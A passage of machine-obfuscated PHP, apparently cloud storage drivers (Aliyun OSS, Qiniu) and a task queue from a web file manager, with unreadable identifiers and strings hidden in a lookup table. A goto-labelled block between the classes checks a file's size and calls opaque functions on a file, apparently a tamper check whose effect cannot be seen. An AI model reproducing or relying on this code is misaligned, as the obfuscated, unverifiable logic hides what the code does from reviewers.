_objectMeta($ï¯ÍùƒŞ) { $­İÎ» =& $_SERVER[¼¥ÊĞÙÌ]; try { $ËÖşºÅ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ï¯ÍùƒŞ)); } catch (OSS\Core\OssException $ØİŸ­ÊÌ) { $this->writeLog(__FUNCTION__ . $­İÎ»[215] . $ØİŸ­ÊÌ->getMessage()); $ËÖşºÅ = !1; } if ($ËÖşºÅ) { $ËÖşºÅ[$­İÎ»[79]] = intval($ËÖşºÅ[$­İÎ»[1498]]); } return $ËÖşºÅ; } protected function _isFolder($úŒ©Óæ‹) { $áÁÎ«Ö =& $_SERVER[¼¥ÊĞÙÌ]; if ($úŒ©Óæ‹ == $áÁÎ«Ö[12] || $úŒ©Óæ‹ == $áÁÎ«Ö[8]) { return !0; } $Â¤ğ×€æ = array($áÁÎ«Ö[1493] => $áÁÎ«Ö[8], $áÁÎ«Ö[1494] => rtrim($úŒ©Óæ‹, $áÁÎ«Ö[8]) . $áÁÎ«Ö[8], $áÁÎ«Ö[1495] => 1, $áÁÎ«Ö[1496] => $áÁÎ«Ö[12]); $é¥Ö‡ƒó = $this->client->listObjects($this->bucket, $Â¤ğ×€æ); if ($é¥Ö‡ƒó->getObjectList() || $é¥Ö‡ƒó->getPrefixList()) { return !0; } return !1; } public function writeLog($ñšŞŒÆÑ = '', $í˜ëÀÒ¤ = false) { $ŸÊØµÒä =& $_SERVER[¼¥ÊĞÙÌ]; $½«ïãÇÉ = in_array(ACTION, array($ŸÊØµÒä[213], $ŸÊØµÒä[214])); if (!$½«ïãÇÉ && !GLOBAL_DEBUG) { return; } $üş•¥öÌ = 0; if (stripos($ñšŞŒÆÑ, $ŸÊØµÒä[1519]) !== !1) { $üş•¥öÌ = 1; $õ˜Ë¹˜é = explode($ŸÊØµÒä[1520], $ñšŞŒÆÑ); $ñšŞŒÆÑ = !empty($õ˜Ë¹˜é[1]) ? $õ˜Ë¹˜é[1] : $ñšŞŒÆÑ; } else { if (stripos($ñšŞŒÆÑ, $ŸÊØµÒä[1521])) { $üş•¥öÌ = 2; $õ˜Ë¹˜é = explode($ŸÊØµÒä[1521], $ñšŞŒÆÑ); $õ˜Ë¹˜é = explode($ŸÊØµÒä[4], $õ˜Ë¹˜é[0]); $ñšŞŒÆÑ = !empty($õ˜Ë¹˜é[1]) ? $õ˜Ë¹˜é[1] : $ñšŞŒÆÑ; } } if ($½«ïãÇÉ && I18n::getType() == $ŸÊØµÒä[1522]) { if ($üş•¥öÌ == 1) { $ñšŞŒÆÑ = str_replace($ŸÊØµÒä[1523], $ŸÊØµÒä[1524], $ñšŞŒÆÑ); } else { if ($üş•¥öÌ == 2) { $õ˜Ë¹˜é = explode($ŸÊØµÒä[215], $õ˜Ë¹˜é[0]); $Ä–™´¹‘ = isset($õ˜Ë¹˜é[1]) ? $õ˜Ë¹˜é[1] : $ŸÊØµÒä[12]; $†¼Úñ¦½ = array($ŸÊØµÒä[1525] => $ŸÊØµÒä[1526], $ŸÊØµÒä[1527] => $ŸÊØµÒä[1528], $ŸÊØµÒä[1529] => $ŸÊØµÒä[1530], $ŸÊØµÒä[1531] => $ŸÊØµÒä[1532], $ŸÊØµÒä[1533] => $ŸÊØµÒä[1534], $ŸÊØµÒä[1535] => $ŸÊØµÒä[1536], $ŸÊØµÒä[1537] => $ŸÊØµÒä[1538], $ŸÊØµÒä[1539] => $ŸÊØµÒä[1540], $ŸÊØµÒä[1541] => $ŸÊØµÒä[1542], $ŸÊØµÒä[1543] => $ŸÊØµÒä[1544]); if (isset($†¼Úñ¦½[$Ä–™´¹‘])) { $ñšŞŒÆÑ = $†¼Úñ¦½[$Ä–™´¹‘]; } } } if (stripos($ñšŞŒÆÑ, $ŸÊØµÒä[1545])) { $ñšŞŒÆÑ = $ŸÊØµÒä[1546]; } } if (!trim($ñšŞŒÆÑ)) { return; } parent::writeLog(trim($ñšŞŒÆÑ), $í˜ëÀÒ¤); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Û×öÀ¦¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[¼¥ÊĞÙÌ][1547]; $this->_init($Û×öÀ¦¨); } public function _init($Á·è‹ß«) { $ÃĞÁÂÉ¬ =& $_SERVER[¼¥ÊĞÙÌ]; $this->config = $Á·è‹ß«; foreach ($Á·è‹ß« as $Ïë£‰·– => $—ÖÅÚıÏ) { if (isset($this->{$Ïë£‰·–})) { $this->{$Ïë£‰·–} = $—ÖÅÚıÏ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÃĞÁÂÉ¬[1548] . LNG($ÃĞÁÂÉ¬[1484])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($„æ—×íü, $¤Ëıƒ— = '', $‹§–¹ˆ› = REPEAT_RENAME) { if ($this->setContent($„æ—×íü, $¤Ëıƒ—)) { return $this->getPathOuter($„æ—×íü); } return !1; } public function mkdir($İ­±¼˜, $ÛÖµ¶“Š = REPEAT_SKIP) { $Æ†—‰Œ˜ =& $_SERVER[¼¥ÊĞÙÌ]; $ßØ¡¾ëÌ = trim($İ­±¼˜, $Æ†—‰Œ˜[8]); if ($this->_isFolder($ßØ¡¾ëÌ)) { return $this->getPathOuter($ßØ¡¾ëÌ); } $İ­±¼˜ = $ßØ¡¾ëÌ . $Æ†—‰Œ˜[8]; $¾ïø·È¤ = get_path_this($ßØ¡¾ëÌ); $¤öÁ¥çò = $İ­±¼˜ . $¾ïø·È¤; if (!$this->mkfile($¤öÁ¥çò)) { return !1; } if (!$this->moveFile($¤öÁ¥çò, $İ­±¼˜)) { $this->delFile($¤öÁ¥çò); return !1; } return $this->getPathOuter($ßØ¡¾ëÌ); } public function copyFile($»èìĞİ¶, $¦æ©€½) { $§ì üç = $this->bucketManager->copy($this->bucket, $»èìĞİ¶, $this->bucket, $¦æ©€½, !0); return $§ì üç ? !1 : $this->getPathOuter($¦æ©€½); } public function moveFile($ŒÃ­®¿â, $³Æ¶öñ´) { $åÆ—ÉÕ‘ = $this->bucketManager->move($this->bucket, $ŒÃ­®¿â, $this->bucket, $³Æ¶öñ´, !0); return $åÆ—ÉÕ‘ ? !1 : $this->getPathOuter($³Æ¶öñ´); } public function delFile($ÔÕûª ) { if (!$this->exist($ÔÕûª )) { return !0; } $Æù Šá¢ = $this->bucketManager->delete($this->bucket, $ÔÕûª ); if (!$Æù Šá¢) { return !0; } return $Æù Šá¢->code() == 612 ? !0 : !1; } public function delFolder($´à†ıá) { $çì·Ø¥È =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->exist($´à†ıá)) { return !0; } $this->listItemCache = !1; $çÕ…š¡Š = $this->fileList($´à†ıá); $this->listItemCache = !0; $¤Âİ—‰ = trim($´à†ıá, $çì·Ø¥È[8]) . $çì·Ø¥È[8]; if (!empty($´à†ıá) && $´à†ıá !== $çì·Ø¥È[231] && !in_array($¤Âİ—‰, $çÕ…š¡Š[$çì·Ø¥È[85]])) { $çÕ…š¡Š[$çì·Ø¥È[85]][] = $¤Âİ—‰; } $ï˜¶Ò¬ = $this->delByBatch($çÕ…š¡Š[$çì·Ø¥È[86]]); if (!$ï˜¶Ò¬) { return !1; } $ï˜¶Ò¬ = $this->delByBatch($çÕ…š¡Š[$çì·Ø¥È[85]]); if (!$ï˜¶Ò¬) { return !1; } return $this->delFile($¤Âİ—‰); } private function delByBatch($Ş„¬¥Ó†) { foreach (array_chunk($Ş„¬¥Ó†, 1000) as $ÎöŠò´‘) { $¸¦ëĞ‡Ø = $this->bucketManager->buildBatchDelete($this->bucket, $ÎöŠò´‘); list($õµÏ­ş´, $Ñ÷Î°Ùõ) = $this->bucketManager->batch($¸¦ëĞ‡Ø); if ($Ñ÷Î°Ùõ) { return !1; } } return !0; } public function rename($Ç¾¦’œ¡, $£±µœ) { return $this->renameObject($Ç¾¦’œ¡, $£±µœ); } public function fileInfo($ãÜ¤˜œê, $ß¹«êĞô = false, $­Œë†›Ç = array()) { $ğç¦ëñ¡ =& $_SERVER[¼¥ÊĞÙÌ]; $©È÷Ó•ë = array($ğç¦ëñ¡[32] => $this->pathThis($ãÜ¤˜œê), $ğç¦ëñ¡[87] => $this->getPathOuter($ğç¦ëñ¡[8] . $ãÜ¤˜œê), $ğç¦ëñ¡[33] => $ğç¦ëñ¡[233], $ğç¦ëñ¡[79] => isset($­Œë†›Ç[$ğç¦ëñ¡[1549]]) ? $­Œë†›Ç[$ğç¦ëñ¡[1549]] : 0, $ğç¦ëñ¡[169] => $this->ext($ãÜ¤˜œê)); if ($ß¹«êĞô) { return $©È÷Ó•ë; } $©È÷Ó•ë[$ğç¦ëñ¡[234]] = $©È÷Ó•ë[$ğç¦ëñ¡[88]] = 0; $©È÷Ó•ë[$ğç¦ëñ¡[235]] = $©È÷Ó•ë[$ğç¦ëñ¡[236]] = !0; if (empty($­Œë†›Ç)) { $­Œë†›Ç = $this->objectMeta($ãÜ¤˜œê); if (!$­Œë†›Ç) { return $©È÷Ó•ë; } } if (isset($­Œë†›Ç[$ğç¦ëñ¡[237]]) && $­Œë†›Ç[$ğç¦ëñ¡[237]]) { $©È÷Ó•ë[$ğç¦ëñ¡[238]] = $­Œë†›Ç[$ğç¦ëñ¡[237]]; } if (isset($­Œë†›Ç[$ğç¦ëñ¡[248]]) && $­Œë†›Ç[$ğç¦ëñ¡[248]]) { $©È÷Ó•ë[$ğç¦ëñ¡[238]] = $­Œë†›Ç[$ğç¦ëñ¡[248]]; } if (isset($­Œë†›Ç[$ğç¦ëñ¡[1550]])) { $©È÷Ó•ë[$ğç¦ëñ¡[88]] = substr($­Œë†›Ç[$ğç¦ëñ¡[1550]] . $ğç¦ëñ¡[12], 0, 10); } if (isset($­Œë†›Ç[$ğç¦ëñ¡[1549]])) { $©È÷Ó•ë[$ğç¦ëñ¡[79]] = $­Œë†›Ç[$ğç¦ëñ¡[1549]]; } return $©È÷Ó•ë; } public function folderInfo($ «ø…Ûà, $Óëäí® = false) { $»ÚÇä°Ì =& $_SERVER[¼¥ÊĞÙÌ]; $‚åªáÛ = array($»ÚÇä°Ì[32] => $this->pathThis($ «ø…Ûà), $»ÚÇä°Ì[87] => $this->getPathOuter($»ÚÇä°Ì[8] . $ «ø…Ûà), $»ÚÇä°Ì[33] => $»ÚÇä°Ì[78]); if ($Óëäí®) { return $‚åªáÛ; } $‚åªáÛ[$»ÚÇä°Ì[234]] = $‚åªáÛ[$»ÚÇä°Ì[88]] = 0; $‚åªáÛ[$»ÚÇä°Ì[235]] = $‚åªáÛ[$»ÚÇä°Ì[236]] = !0; $ «ø…Ûà = rtrim($ «ø…Ûà, $»ÚÇä°Ì[8]) . $»ÚÇä°Ì[8]; $ÍÖ·å”” = $this->objectMeta($ «ø…Ûà); if (isset($ÍÖ·å””[$»ÚÇä°Ì[1550]])) { $‚åªáÛ[$»ÚÇä°Ì[88]] = substr($ÍÖ·å””[$»ÚÇä°Ì[1550]] . $»ÚÇä°Ì[12], 0, 10); } return $‚åªáÛ; } public function listPath($¶ÈÖü§È, $ÅöŸŸå = false) { $Ã¦õäå¡ =& $_SERVER[¼¥ÊĞÙÌ]; $¡¨ãâÕÏ = $this->fileList($¶ÈÖü§È, $Ã¦õäå¡[8], !0); foreach ($¡¨ãâÕÏ[$Ã¦õäå¡[85]] as $Ò’ÔÌñ¨ => $¢İîÔ¤Ô) { $¡¨ãâÕÏ[$Ã¦õäå¡[85]][$Ò’ÔÌñ¨] = $this->folderInfo($¢İîÔ¤Ô, $ÅöŸŸå); } foreach ($¡¨ãâÕÏ[$Ã¦õäå¡[86]] as $Ò’ÔÌñ¨ => $¢İîÔ¤Ô) { $¡¨ãâÕÏ[$Ã¦õäå¡[86]][$Ò’ÔÌñ¨] = $this->fileInfo($¢İîÔ¤Ô[$Ã¦õäå¡[32]], $ÅöŸŸå, $¢İîÔ¤Ô); } return $¡¨ãâÕÏ; } public function has($É»›¯×Ä, $†ºÁŒ°… = false, $áÉÇÎ³Õ = true) { $íÔ¢¡ìÅ =& $_SERVER[¼¥ÊĞÙÌ]; $É»›¯×Ä = trim($É»›¯×Ä, $íÔ¢¡ìÅ[8]); $¡Ïôşó = empty($É»›¯×Ä) && $É»›¯×Ä !== $íÔ¢¡ìÅ[231] ? $íÔ¢¡ìÅ[12] : $É»›¯×Ä . $íÔ¢¡ìÅ[8]; $õëèÀõ¡ = $íÔ¢¡ìÅ[12]; $îÈÄÙº½ = 500; $¶“Á¹šŠ = $íÔ¢¡ìÅ[8]; $¶­˜²¡ú = $À†ñØ´Ç = 0; while (!0) { check_abort(); list($ª¯Õá¬, $“ñ¶Ë¹) = $this->bucketManager->listFiles($this->bucket, $¡Ïôşó, $õëèÀõ¡, $îÈÄÙº½, $¶“Á¹šŠ); if ($“ñ¶Ë¹) { break; } $õëèÀõ¡ = array_key_exists($íÔ¢¡ìÅ[1496], $ª¯Õá¬) ? $õëèÀõ¡ = $ª¯Õá¬[$íÔ¢¡ìÅ[1551]] : $íÔ¢¡ìÅ[12]; if ($†ºÁŒ°…) { if (!empty($ª¯Õá¬[$íÔ¢¡ìÅ[1552]])) { $¶­˜²¡ú += count($ª¯Õá¬[$íÔ¢¡ìÅ[1552]]); } if (!empty($ª¯Õá¬[$íÔ¢¡ìÅ[1553]])) { $À†ñØ´Ç += count($ª¯Õá¬[$íÔ¢¡ìÅ[1553]]); } if ($õëèÀõ¡ === $íÔ¢¡ìÅ[12]) { break; } continue; } if ($áÉÇÎ³Õ) { if (!empty($ª¯Õá¬[$íÔ¢¡ìÅ[1552]])) { return !0; } } else { if (!empty($ª¯Õá¬[$íÔ¢¡ìÅ[1553]])) { return !0; } } if ($õëèÀõ¡ === $íÔ¢¡ìÅ[12]) { break; } } if ($†ºÁŒ°…) { return array($íÔ¢¡ìÅ[242] => $¶­˜²¡ú, $íÔ¢¡ìÅ[243] => $À†ñØ´Ç); } return !1; } public function listAll($³ÛÒµÍ) { $øÔ»òşÎ =& $_SERVER[¼¥ÊĞÙÌ]; $®Ğ¡Æ„â = $this->fileList($³ÛÒµÍ, $øÔ»òşÎ[12], !0); $¡àØ²¯î = array_to_keyvalue($®Ğ¡Æ„â[$øÔ»òşÎ[86]], $øÔ»òşÎ[32]); foreach ($®Ğ¡Æ„â[$øÔ»òşÎ[85]] as $İáÏ“÷¬) { if (is_string($İáÏ“÷¬)) { $¡àØ²¯î[$İáÏ“÷¬] = array($øÔ»òşÎ[79] => 0); } } return $this->listAllFiles($³ÛÒµÍ, $¡àØ²¯î); } private function fileList($âáÄ³–º, $Ö¼”¹¨ = '', $’âçÓ = 0) { $¦èÉ¡âñ =& $_SERVER[¼¥ÊĞÙÌ]; $âáÄ³–º = trim($âáÄ³–º, $¦èÉ¡âñ[8]); $™‰…§Î = empty($âáÄ³–º) && $âáÄ³–º !== $¦èÉ¡âñ[231] ? $¦èÉ¡âñ[12] : $âáÄ³–º . $¦èÉ¡âñ[8]; $¾ğ›Óû = $¦èÉ¡âñ[12]; $ê÷¤‡Ü = 1000; $™–¹ïÅ = $ó›©¿ù¥ = array(); while (!0) { check_abort(); list($åÌÑãíŠ, $ı«ÜÃÙì) = $this->bucketManager->listFiles($this->bucket, $™‰…§Î, $¾ğ›Óû, $ê÷¤‡Ü, $Ö¼”¹¨); if ($ı«ÜÃÙì) { break; } $¾ğ›Óû = array_key_exists($¦èÉ¡âñ[1496], $åÌÑãíŠ) ? $¾ğ›Óû = $åÌÑãíŠ[$¦èÉ¡âñ[1551]] : $¦èÉ¡âñ[12]; $™Ï ŞØß = isset($åÌÑãíŠ[$¦èÉ¡âñ[1552]]) ? $åÌÑãíŠ[$¦èÉ¡âñ[1552]] : array(); $ŸÚªü­Ø = isset($åÌÑãíŠ[$¦èÉ¡âñ[1553]]) ? $åÌÑãíŠ[$¦èÉ¡âñ[1553]] : array(); foreach ($™Ï ŞØß as $³Ù€Ú´¶) { if ($³Ù€Ú´¶[$¦èÉ¡âñ[97]] == $™‰…§Î) { continue; } $Ó”¶½Ñå = $³Ù€Ú´¶[$¦èÉ¡âñ[97]]; $„êü”ü÷ = $³Ù€Ú´¶[$¦èÉ¡âñ[1549]]; $³Ù€Ú´¶[$¦èÉ¡âñ[32]] = $Ó”¶½Ñå; $³Ù€Ú´¶[$¦èÉ¡âñ[79]] = $„êü”ü÷; $Ù´ø¦Øœ = $„êü”ü÷ == 0 && substr($Ó”¶½Ñå, strlen($Ó”¶½Ñå) - 1, 1) == $¦èÉ¡âñ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ó”¶½Ñå, $Ù´ø¦Øœ, $³Ù€Ú´¶); if ($Ù´ø¦Øœ) { $™–¹ïÅ[] = $Ó”¶½Ñå; continue; } $ó›©¿ù¥[] = $’âçÓ ? $³Ù€Ú´¶ : $Ó”¶½Ñå; } foreach ($ŸÚªü­Ø as $Ó”¶½Ñå) { if ($Ó”¶½Ñå == $™‰…§Î) { continue; } $™–¹ïÅ[] = $Ó”¶½Ñå; $this->cacheMethodInfoSet($Ó”¶½Ñå, !0); } if ($¾ğ›Óû === $¦èÉ¡âñ[12]) { break; } } $this->cacheMethodInfoSet($âáÄ³–º, !0); return array($¦èÉ¡âñ[85] => $™–¹ïÅ, $¦èÉ¡âñ[86] => $ó›©¿ù¥); } public function canRead($şãÂæçÀ) { return $this->exist($şãÂæçÀ) ? !0 : !1; } public function canWrite($ú‡ÍÄ·) { return $this->exist($ú‡ÍÄ·) ? !0 : !1; } public function getContent($¼éÕğìæ) { return $this->fileSubstr($¼éÕğìæ, 0, -1); } public function setContent($°«òš¦ç, $ÈææîÌ = '') { $Æ¿µË¹Ç = $this->tempFile($this->pathThis($°«òš¦ç)); file_put_contents($Æ¿µË¹Ç, $ÈææîÌ); if ($this->upload($°«òš¦ç, $Æ¿µË¹Ç)) { $this->tempFileRemve($Æ¿µË¹Ç); return !0; } return !1; } public function refreshUrls($öùãî´†) { $ÍîÈÛı =& $_SERVER[¼¥ÊĞÙÌ]; $İ›±ğ« = array(); if (is_array($öùãî´†)) { foreach ($öùãî´† as $¿œ„Š¾Ó) { $İ›±ğ«[] = $this->link($¿œ„Š¾Ó); } } else { $İ›±ğ«[] = $this->link($öùãî´†); } $ƒ£¶×Éğ = new Qiniu\Cdn\CdnManager($this->auth); list($¾ÀÈÜÑ¨, $³£²·øÄ) = $ƒ£¶×Éğ->refreshUrls($İ›±ğ«); if ($³£²·øÄ) { return !1; } return $¾ÀÈÜÑ¨[$ÍîÈÛı[1276]] == $ÍîÈÛı[833] ? !0 : !1; } public function fileSubstr($ä‹Û­®, $ñ†ï©ª, $¬¹Òù½ˆ) { $Ï¤¦©œ¨ =& $_SERVER[¼¥ÊĞÙÌ]; if (!($úµİ¥…¶ = $this->link($ä‹Û­®))) { return !1; } $™»ÄáËĞ = !1; if ($¬¹Òù½ˆ > 0) { $ş¥ÆËÊù = $ñ†ï©ª + $¬¹Òù½ˆ - 1; $™»ÄáËĞ = array($Ï¤¦©œ¨[1554] . $ñ†ï©ª . $Ï¤¦©œ¨[465] . $ş¥ÆËÊù); } $™ˆÚöïê = url_request($úµİ¥…¶, $Ï¤¦©œ¨[1515], !1, $™»ÄáËĞ); return $™ˆÚöïê[$Ï¤¦©œ¨[824]] ? $™ˆÚöïê[$Ï¤¦©œ¨[1299]] : !1; } public function upload($ÖµØÉ, $ñàé°õ¬, $›©˜øã™ = false, $ÉÀ”›¬› = REPEAT_REPLACE) { $²ˆ¼ÙÌ = new Qiniu\Storage\UploadManager(); $ä‹¶ß = $this->auth->uploadToken($this->bucket, $ÖµØÉ); $Ì¯ö°× = get_file_mime(get_path_ext($ñàé°õ¬)); list($‘ıßæ¨², $½æØØ•Ô) = $²ˆ¼ÙÌ->putFile($ä‹¶ß, $ÖµØÉ, $ñàé°õ¬, null, $Ì¯ö°×); return $½æØØ•Ô ? !1 : $this->getPathOuter($ÖµØÉ); } public function uploadFormData($ïË÷äÌ, $†ßÖØ„‚ = 3600) { return $this->uploadToken($ïË÷äÌ, $†ßÖØ„‚); } public function uploadMultiData($±ôã•Ô, $å„áúÑ© = 3600) { return $this->uploadToken($±ôã•Ô, $å„áúÑ©); } private function uploadToken($’³¢ğŸ, $–Í° ¡¿ = 3600) { $€»íàŒ™ =& $_SERVER[¼¥ÊĞÙÌ]; $¤–Ãù´³ = $–Í° ¡¿; $ÃÅš»Šç = array($€»íàŒ™[1555] => $€»íàŒ™[1556]); $à¹ö••¤ = $’³¢ğŸ; $ÇÓ†÷Éç = $this->auth->uploadToken($this->bucket, $à¹ö••¤, $¤–Ãù´³, $ÃÅš»Šç, !0); $ùóûıÜÏ = empty($this->region) || $this->region == $€»íàŒ™[1557] ? $€»íàŒ™[12] : $€»íàŒ™[465] . $this->region; $¾ßáïË = http_type() . "\72\x2f\57\165\160\154\157\141\x64{$ùóûıÜÏ}\56\161\x69\x6e\x69\x75\x70\56\143\x6f\x6d\57"; return array($€»íàŒ™[1558] => $ÇÓ†÷Éç, $€»íàŒ™[1559] => $¾ßáïË); } public function download($‹‘ñŒÛÍ, $®÷§Şõ) { $ŞëŸšĞ„ = IO::getPathInner(IO::mkfile($®÷§Şõ)); if (!($»ÉèëÚü = $this->link($‹‘ñŒÛÍ))) { return !1; } $îØáÃÛî = 0; $Àî«üÑ = 1024 * 200; $Ë…³¶ò = fopen($ŞëŸšĞ„, $_SERVER[¼¥ÊĞÙÌ][1560]); while (!0) { $î˜¯„ = $this->fileSubstr($‹‘ñŒÛÍ, $îØáÃÛî, $Àî«üÑ); if ($î˜¯„ === !1) { return !1; } fwrite($Ë…³¶ò, $î˜¯„); $îØáÃÛî += $Àî«üÑ; if (strlen($î˜¯„) < $Àî«üÑ) { break; } } fclose($Ë…³¶ò); return $®÷§Şõ; } public function link($ÕğÕš×Ÿ, $ú²Ñ‹ßÌ = '') { if (!$this->isFile($ÕğÕš×Ÿ)) { return !1; } $‰ğ Ô¾Ñ = $this->getHost() . $_SERVER[¼¥ÊĞÙÌ][8] . $this->pathEncode($ÕğÕš×Ÿ) . $ú²Ñ‹ßÌ; return $this->auth->privateDownloadUrl($‰ğ Ô¾Ñ, 3600 * 12); } public function fileOut($ÊÆàˆÅ, $ô™°Ù·¿ = false, $ï§×Ô«† = false, $Ñ„ÚïœŠ = '') { $‰¹ÇúÖú =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÊÆàˆÅ, $ô™°Ù·¿, $ï§×Ô«†, $Ñ„ÚïœŠ); } if (!$ï§×Ô«†) { $ï§×Ô«† = $this->pathThis($ÊÆàˆÅ); } $èØµÂ®û = $ô™°Ù·¿ ? $‰¹ÇúÖú[1561] . rawurlencode($ï§×Ô«†) : $‰¹ÇúÖú[12]; $æ«€ˆ«º = $this->link($ÊÆàˆÅ, $èØµÂ®û); $this->fileOutLink($æ«€ˆ«º); } public function fileOutServer($Œİ¡ ø–, $ Ù£Àâï = false, $èŞÄŒÏ† = false, $¹ºİï÷÷ = '') { parent::fileOut($Œİ¡ ø–, $ Ù£Àâï, $èŞÄŒÏ†, $¹ºİï÷÷); } public function fileOutImage($Ã®ø¬æö, $Ï¾Ş¦Õ = 250) { if ($this->size($Ã®ø¬æö) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ã®ø¬æö, $Ï¾Ş¦Õ); } $ø™ñ°Èª = $this->link($Ã®ø¬æö, $_SERVER[¼¥ÊĞÙÌ][1562] . $Ï¾Ş¦Õ); $this->fileOutLink($ø™ñ°Èª); } public function fileOutImageServer($ÌĞ©µ¡, $æ€éÂš = 250) { parent::fileOutImage($ÌĞ©µ¡, $æ€éÂš); } public function hashMd5($çøæ× ) { $ñ€Ëò«â =& $_SERVER[¼¥ÊĞÙÌ]; $àİ˜¼øü = $this->objectMeta($çøæ× ); return isset($àİ˜¼øü[$ñ€Ëò«â[248]]) ? $àİ˜¼øü[$ñ€Ëò«â[248]] : !1; $‹§Ë¼Á = $this->link($çøæ× , $ñ€Ëò«â[1563]); } public function size($®„¨õâ‚) { $Îİï»Ò“ = $this->objectMeta($®„¨õâ‚); return $Îİï»Ò“ ? $Îİï»Ò“[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function info($´„¹ÊûÅ) { if ($this->isFolder($´„¹ÊûÅ)) { return $this->folderInfo($´„¹ÊûÅ); } else { if ($this->isFile($´„¹ÊûÅ)) { return $this->fileInfo($´„¹ÊûÅ); } } return !1; } public function exist($ïšçÕ«û) { return $this->isFile($ïšçÕ«û) || $this->isFolder($ïšçÕ«û); } public function isFile($ÊÅĞµüØ) { return !$this->isFolder($ÊÅĞµüØ) && $this->objectMeta($ÊÅĞµüØ); } public function isFolder($Ç†ÜÈÊ) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][180], $Ç†ÜÈÊ); } protected function objectMeta($§á»†Ëö) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][182], $§á»†Ëö); } protected function _objectMeta($Ñî˜ÎÇ) { $‚ÑºËî€ =& $_SERVER[¼¥ÊĞÙÌ]; list($’Ó€÷éÚ, $Ê¼¯°¥±) = $this->bucketManager->stat($this->bucket, $Ñî˜ÎÇ); if ($’Ó€÷éÚ) { $’Ó€÷éÚ[$‚ÑºËî€[79]] = intval($’Ó€÷éÚ[$‚ÑºËî€[1549]]); } return $’Ó€÷éÚ; } protected function _isFolder($¬×Âİ¤×) { $Ø¾’æÑÈ =& $_SERVER[¼¥ÊĞÙÌ]; if ($¬×Âİ¤× == $Ø¾’æÑÈ[12] || $¬×Âİ¤× == $Ø¾’æÑÈ[8]) { return !0; } list($À¾ŒÅšË, $“öçÂç¾) = $this->bucketManager->listFiles($this->bucket, trim($¬×Âİ¤×, $Ø¾’æÑÈ[8]) . $Ø¾’æÑÈ[8], $Ø¾’æÑÈ[12], 1, $Ø¾’æÑÈ[8]); return !empty($À¾ŒÅšË[$Ø¾’æÑÈ[1552]]) || !empty($À¾ŒÅšË[$Ø¾’æÑÈ[1553]]) ? !0 : !1; } } goto E­šŒóÃõÄ; C¨å»ÏÎÊ­: if ($_SERVER[$_SERVER[¼¥ÊĞÙÌ][959]] != $_size($_file)) { $_getc = $_SERVER[¼¥ÊĞÙÌ][961]; $_getfile = $_SERVER[$_SERVER[¼¥ÊĞÙÌ][962]] . $_SERVER[¼¥ÊĞÙÌ][963]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼¥ÊĞÙÌ][288], $_getfilec); if (count($_getarrs) < $_SERVER[¼¥ÊĞÙÌ][695]) { $exit = $_SERVER[¼¥ÊĞÙÌ][964]; $exit(); } $_act = $_SERVER[¼¥ÊĞÙÌ][1145]; $_act($_file); } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\165\145\165\145\x4c\145\156\x67\164\150"; const QUEUE_DATA = "\164\x61\x73\153\121\x75\x65\x75\145\x44\x61\x74\141"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\x75\145\165\x65\x4c\x61\163\x74\122\x75\x6e"; const QUEUE_THREAD = "\x74\x61\x73\153\121\165\x65\165\x65\124\x68\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($–¦ùäğ¿, $ç§Å•… = array(), $¢Ÿãö• = '', $ûÆÍ‚ØÈ = '') { $ûéÎºâ‰ =& $_SERVER[¼¥ÊĞÙÌ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ûÆÍ‚ØÈ && array_find_by_field(self::$listData, $ûéÎºâ‰[97], $ûÆÍ‚ØÈ)) { return !0; } if ($ûÆÍ‚ØÈ && array_find_by_field(self::$listDataAdd, $ûéÎºâ‰[97], $ûÆÍ‚ØÈ)) { return !0; } self::$listDataAdd[] = array($ûéÎºâ‰[344] => $–¦ùäğ¿, $ûéÎºâ‰[1890] => $ç§Å•…, $ûéÎºâ‰[529] => $¢Ÿãö•, $ûéÎºâ‰[97] => $ûÆÍ‚ØÈ); return !0; } public static function addSubmit() { $“ü“ïĞï =& $_SERVER[¼¥ÊĞÙÌ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($“ü“ïĞï[1891] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $“ü“ïĞï[12], $“ü“ïĞï[529])), $“ü“ïĞï[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($‰…ÓÇÖœ, $’ÜƒË‰š = array(), $İ’ó‚ëı = '', $»¾±ñ‘ğ = '') { $®Êê¹¯Ğ =& $_SERVER[¼¥ÊĞÙÌ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $†ª¸“†‹ = self::getAll(); if ($»¾±ñ‘ğ && array_find_by_field($†ª¸“†‹, $®Êê¹¯Ğ[97], $»¾±ñ‘ğ)) { return !0; } $†ª¸“†‹[] = array($®Êê¹¯Ğ[344] => $‰…ÓÇÖœ, $®Êê¹¯Ğ[1890] => $’ÜƒË‰š, $®Êê¹¯Ğ[529] => $İ’ó‚ëı, $®Êê¹¯Ğ[97] => $»¾±ñ‘ğ); self::setAll($†ª¸“†‹); 